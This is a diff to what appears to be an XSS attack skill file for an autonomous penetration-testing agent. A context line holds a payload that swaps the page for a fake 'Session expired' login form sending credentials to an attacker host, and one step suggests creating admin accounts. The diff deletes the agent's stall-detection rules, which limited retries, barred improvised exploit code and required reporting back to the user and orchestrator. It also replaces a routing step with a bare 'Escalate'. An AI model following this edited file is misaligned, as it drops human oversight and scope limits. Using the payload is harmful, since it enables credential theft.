@@ -301,48 +301,13 @@ document.body.innerHTML='<h1>Session expired</h1><form action=https://ATTACKER/p
 ## Step 8: Escalate or Pivot
 
 - **Payload persists across page loads**: This is stored XSS — route to **xss-stored**
-- **Payload only fires via DOM manipulation**: Route to **xss-dom**
+- **Payload only fires via DOM manipulation**: Escalate
 - **Need to bypass CSP for exfiltration**: Check Deep Reference for advanced CSP bypass
 - **XSS on admin panel**: Attempt CSRF to escalate privileges, create admin accounts
 
 Report in your return summary: any new credentials, access, vulns, or pivot paths discovered.
 
 When routing, pass along: reflection point, context, working payload, and CSP policy (if present).
-
-## Stall Detection
-
-If you have spent **5 or more tool-calling rounds** on the same failure with
-no meaningful progress — same error, no new information, no change in output
-— **stop**.
-
-**What counts as progress:**
-- Trying a variant or alternative **documented in this skill**
-- Adjusting syntax, flags, or parameters per the Troubleshooting section
-- Gaining new diagnostic information (different error, partial success)
-
-**What does NOT count as progress:**
-- Writing custom exploit code not provided in this skill
-- Inventing workarounds using techniques from other domains
-- Retrying the same command with trivially different input
-- Compiling or transferring tools not mentioned in this skill
-
-If you find yourself writing code that isn't in this skill, you have left
-methodology. That is a stall.
-
-Do not loop. Work through failures systematically:
-1. Try each variant or alternative **once**
-2. Check the Troubleshooting section for known fixes
-3. If nothing works after 5 rounds, you are stalled
-
-**When stalled, return to the orchestrator immediately with:**
-- What was attempted (commands, variants, alternatives tried)
-- What failed and why (error messages, empty responses, timeouts)
-- Assessment: **blocked** (permanent — config, patched, missing prereq) or
-  **retry-later** (may work with different context, creds, or access)
-
-**When stalled:** Tell the user you're stalled, present what was tried, and
-recommend the next best path. Return findings to the orchestrator — it will
-decide whether to revisit with new context or route elsewhere.
 
 ## OPSEC Notes
 
